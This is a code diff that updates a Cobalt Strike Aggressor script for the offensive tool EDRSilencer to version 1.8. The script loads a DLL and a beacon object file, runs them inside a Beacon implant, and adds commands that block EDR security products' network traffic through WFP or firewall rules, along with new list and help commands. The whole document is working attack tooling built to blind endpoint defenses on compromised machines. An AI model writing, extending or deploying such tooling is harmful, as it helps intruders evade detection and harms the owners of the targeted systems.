@@ -1,36 +1,51 @@
-# EDRSilencer - Cobalt Strike Aggressor Script V1.7
+# EDRSilencer - Cobalt Strike Aggressor Script V1.8
 
 # Global state to track the current mode
 $edr_silencer_mode = "wfp"; # Default mode
 
-sub execute_edrsilencer_bof {
-    local('$bid $command $arg1 $dll_bytes $bof_args');
-    ($bid, $command, $arg1) = @_;
+# Cache for DLL and BOF bytes to avoid repeated disk I/O
+$EDRSILENCER_DLL_BYTES = "";
+$EDRSILENCER_BOF_BYTES = "";
 
-    # Read the DLL file from the C2 server's disk
+sub load_resources {
+    local('$dll_path $bof_path $handle');
+
+    # Read the DLL file once on script load
     $dll_path = script_resource("EDRSilencer/EDRSilencer.dll");
     $handle = openf($dll_path);
-    $dll_bytes = readb($handle, -1);
+    $EDRSILENCER_DLL_BYTES = readb($handle, -1);
     closef($handle);
 
-    # Read the BOF file
+    # Read the BOF file once on script load
     $bof_path = script_resource("EDRSilencer/bof_loader.x64.o");
     $handle = openf($bof_path);
-    $bof_bytes = readb($handle, -1);
+    $EDRSILENCER_BOF_BYTES = readb($handle, -1);
     closef($handle);
+
+    if (strlen($EDRSILENCER_DLL_BYTES) == 0 || strlen($EDRSILENCER_BOF_BYTES) == 0) {
+        elog("[EDRSilencer] Error: Failed to load DLL or BOF resources.");
+    }
+}
+
+# Load resources at script import time
+load_resources();
+
+sub execute_edrsilencer_bof {
+    local('$bid $command $arg1 $bof_args');
+    ($bid, $command, $arg1) = @_;
 
     # Pack the DLL bytes and command as arguments for the BOF
     if ($command eq "setmode") {
-        $bof_args = bof_pack($bid, "bzi", $dll_bytes, $command, $arg1);
+        $bof_args = bof_pack($bid, "bzi", $EDRSILENCER_DLL_BYTES, $command, $arg1);
     } else if ($arg1 is $null) {
-        $bof_args = bof_pack($bid, "bz", $dll_bytes, $command);
+        $bof_args = bof_pack($bid, "bz", $EDRSILENCER_DLL_BYTES, $command);
     } else {
-        $bof_args = bof_pack($bid, "bzz", $dll_bytes, $command, $arg1);
+        $bof_args = bof_pack($bid, "bzz", $EDRSILENCER_DLL_BYTES, $command, $arg1);
     }
 
     # Execute the BOF in the Beacon
     BeaconPrintf($bid, "[+] Executing EDRSilencer BOF in [" . $edr_silencer_mode . "] mode for command: " . $command);
-    bof_execute($bid, $bof_bytes, $bof_args);
+    bof_execute($bid, $EDRSILENCER_BOF_BYTES, $bof_args);
 }
 
 command "edr_set_mode" {
@@ -58,10 +73,18 @@ command "edr_block" {
 }
 
 command "edr_add" {
+    if ($2 is $null) {
+        berror($1, "Usage: edr_add <full_process_path>");
+        return;
+    }
     execute_edrsilencer_bof($1, "add", $2);
 }
 
 command "edr_remove" {
+    if ($2 is $null) {
+        berror($1, "Usage: edr_remove <id_or_path>");
+        return;
+    }
     execute_edrsilencer_bof($1, "removeid", $2);
 }
 
@@ -71,4 +94,25 @@ command "edr_removeall" {
 
 command "edr_initialize" {
     execute_edrsilencer_bof($1, "init", $null);
+}
+
+command "edr_list" {
+    execute_edrsilencer_bof($1, "list", $null);
+}
+
+command "edr_help" {
+    binfo($1, "--- EDRSilencer Help ---");
+    binfo($1, "Current Mode: " . $edr_silencer_mode);
+    binfo($1, "");
+    binfo($1, "Usage: edr_command [arguments...]");
+    binfo($1, "Commands:");
+    binfo($1, "  edr_help                     - Shows this help menu.");
+    binfo($1, "  edr_set_mode <wfp|firewall>  - Sets the operational mode (default: wfp).");
+    binfo($1, "  edr_block                    - Blocks all detected EDR processes.");
+    binfo($1, "  edr_add <path>               - Adds a block rule for a specific process path.");
+    binfo($1, "  edr_list                     - (WFP Mode Only) Lists all WFP rules created by this tool.");
+    binfo($1, "  edr_remove <id_or_path>      - Removes a specific rule.");
+    binfo($1, "      In 'wfp' mode: provide the numeric Filter ID from 'edr_list'.");
+    binfo($1, "      In 'firewall' mode: provide the full process path.");
+    binfo($1, "  edr_removeall                - Removes all rules, sublayers, and providers created by this tool.");
 }
